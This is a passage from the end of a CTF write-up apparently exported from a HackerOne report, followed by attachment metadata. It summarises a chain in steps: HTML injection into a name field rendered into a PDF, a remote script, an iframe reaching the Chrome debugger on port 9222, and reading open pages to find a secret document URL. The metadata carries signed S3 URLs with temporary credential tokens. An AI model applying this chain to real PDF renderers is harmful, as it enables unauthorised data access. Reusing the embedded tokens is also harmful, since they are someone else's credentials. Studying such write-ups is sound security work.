src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2TDJkTkdWEf84jEGSW3z2YUc?response-content-disposition=attachment%3B%20filename%3D%22iframe-devtools.png%22%3B%20filename%2A%3DUTF-8%27%27iframe-devtools.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=1321fa2ef00293f9eda3dcd297692fe8c367adae494fdecc6740108003ac0506\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAs we can see in the output, on another tab / window a page with the following URL was open:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"third-vulnerability-tldr\"\u003eThird vulnerability - TLDR\u003c/h2\u003e\n\n\u003cp\u003e1) The support chat review page allows for review support chats \u003cem\u003eand\u003c/em\u003e for updating user account properties\u003cbr\u003e\n2) From the support review page, \u003cem\u003eany\u003c/em\u003e user account can be updated (just not Jobert\u0026#39;s account!)\u003cbr\u003e\n3) The support review page \u003cem\u003ealso\u003c/em\u003e does not strip special characters, allowing for HTML to be injected into a user\u0026#39;s name field\u003cbr\u003e\n4) The user\u0026#39;s name field is rendered in the PDF when an image is converted.  If it contains HTML it will be parsed and rendered as HTML content\u003cbr\u003e\n5) A script tag can be injected including remote scripts to get around any length restrictions for the HTML injection\u003cbr\u003e\n6) Using a script we can inject an \u003ccode\u003e\u0026lt;iframe\u0026gt;\u003c/code\u003e into the PDF output.  This can be used to load a view of the Chrome debugger on port \u003ccode\u003e9222\u003c/code\u003e\u003cbr\u003e\n7) Inspect the open pages via the Chrome debugger\u0026#39;s \u003ccode\u003e/json\u003c/code\u003e endpoint to discover the secret document URL.\u003c/p\u003e\n\n\u003ch2 id=\"jobert-s-missing-document\"\u003eJobert\u0026#39;s Missing Document\u003c/h2\u003e\n\n\u003cp\u003eAt long last we have the magic hash for Jobert\u0026#39;s lost document.  Testing previously showed that access to document URL\u0026#39;s are not restricted, they are simply protected by each having a unique hash.  This meant that we could access the missing document simply by accessing:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis gives the document including the flag:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eh1ctf{y3s_1m_c0sm1c_n0w}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt would only be fitting to make a meme for this, so here\u0026#39;s my attempt:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"meme.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xP3mfZZm91pZcew2iL7cYhtt?response-content-disposition=attachment%3B%20filename%3D%22meme.png%22%3B%20filename%2A%3DUTF-8%27%27meme.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=e5cff60001d8f300c2af7a9f31fa4ccb41d2d1d36b408d6aaa888fc2ed7f4b86\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xP3mfZZm91pZcew2iL7cYhtt?response-content-disposition=attachment%3B%20filename%3D%22meme.png%22%3B%20filename%2A%3DUTF-8%27%27meme.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=e5cff60001d8f300c2af7a9f31fa4ccb41d2d1d36b408d6aaa888fc2ed7f4b86\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDoes anyone else wonder if this was the inspiration for this CTF?: \u003ca title=\"https://hackerone.com/reports/745324\" href=\"https://hackerone.com/reports/745324\"\u003ehttps://hackerone.com/reports/745324\u003c/a\u003e\u003c/p\u003e\n","weakness":{"id":56,"name":"Security Through Obscurity"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":692033,"file_name":"start-tweet.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pRF1oJPgDKEaKQbsSu4xuM6u?response-content-disposition=attachment%3B%20filename%3D%22start-tweet.png%22%3B%20filename%2A%3DUTF-8%27%27start-tweet.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=75e82451a9996a9498bd985366f079d31dc5b50a05ad28b5744994ceb49de970","file_size":31008,"type":"image/png"},{"id":692041,"file_name":"support-page.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YV5vArCXCBL2HWnqN7MjJBT2?response-content-disposition=attachment%3B%20filename%3D%22support-page.png%22%3B%20filename%2A%3DUTF-8%27%27support-page.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=21bc2eed59073233f2197b5aeea1dc52c4b26b40224bcaae1abb5d075abbf675","file_size":19320,"type":"image/png"},{"id":692050,"file_name":"hint-tweet.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ELBi7b1Xsi3Z5yt4gWSGhguj?response-content-disposition=attachment%3B%20filename%3D%22hint-tweet.png%22%3B%20filename%2A%3DUTF-8%27%27hint-tweet.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=3ac11de9c8e60beeac68c8db107c23117902affc71afd13b960560f844fea808","file_size":23648,"type":"image/png"},{"id":692055,"file_name":"jobert-login.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/SsPgyrHnkhz4R1BAAvYxW2H9?response-content-disposition=attachment%3B%20filename%3D%22jobert-login.png%22%3B%20filename%2A%3DUTF-8%27%27jobert-login.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=b323cca6f028aa9863e6e30be3e9202b750051bbeeab8003671644e38f0bbc50","file_size":50147,"type":"image/png"},{"id":692062,"file_name":"qr-code-demo.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/G6mQvFY35nJRaPxthS9T1mXf?response-content-disposition=attachment%3B%20filename%3D%22qr-code-demo.png%22%3B%20filename%2A%3DUTF-8%27%27qr-code-demo.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=d131429ad8cbd29c25af28aac4fc449cafb3d51a325baddee5ead2c6df2bf37c","file_size":77434,"type":"image/png"},{"id":692075,"file_name":"first-vuln.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hbA2eHZSegQ5GeMcodxhd7Et?response-content-disposition=attachment%3B%20filename%3D%22first-vuln.png%22%3B%20filename%2A%3DUTF-8%27%27first-vuln.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=f6aaa0ada73661891db263d8886e2f7b0b64aaf155c19e4ede7d996dc23caf8f","file_size":37317,"type":"image/png"},{"id":692168,"file_name":"sup3.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-